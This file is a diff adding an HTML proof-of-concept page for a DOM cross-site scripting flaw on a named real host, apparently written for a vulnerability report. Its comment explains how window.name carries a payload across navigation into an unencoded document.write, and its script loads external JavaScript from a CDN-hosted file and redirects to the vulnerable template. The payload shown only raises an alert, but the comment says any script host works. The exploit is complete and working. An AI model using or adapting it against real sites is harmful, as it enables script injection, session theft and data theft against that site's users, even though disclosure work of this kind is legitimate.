@@ -1,0 +1,28 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>PoC</title>
+<!--
+  WC-126 - DOM XSS on i5.wal.co via window.name -> document.write.
+
+  Open this page. It writes the payload into this browsing context's window.name and then
+  navigates the SAME TAB to the safeframe template, which passes the `html` property into
+  document.write with no encoding at all.
+
+  window.name belongs to the browsing context, not to any document, so it survives the
+  cross-origin navigation - that is the whole delivery mechanism. No popup, no target
+  attribute, no zero-click requirement beyond opening this one page.
+
+  The payload is a public 215-byte file whose entire contents are `alert(document.domain)`,
+  so the dialog that appears states the origin the code ran on. Any host serving valid
+  JavaScript works identically: the template applies no check to the URL whatsoever.
+-->
+<script>
+  window.name = encodeURIComponent(JSON.stringify({
+    id: "poc",
+    html: '<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"><\/script>',
+    config: { sfLoadEvent: "instant", sfType: "ads" }
+  }));
+  location.href = "https://i5.wal.co/dfw/63fd9f59-d6ba/07b8ea82-184c-4ea3-8ac0-5dc1981e40c8/v87/safeframe.html";
+</script>
+<p>Redirecting to the template&hellip;</p>
+<p><a href="https://i5.wal.co/dfw/63fd9f59-d6ba/07b8ea82-184c-4ea3-8ac0-5dc1981e40c8/v87/safeframe.html">Open manually</a> if the redirect does not fire.</p>
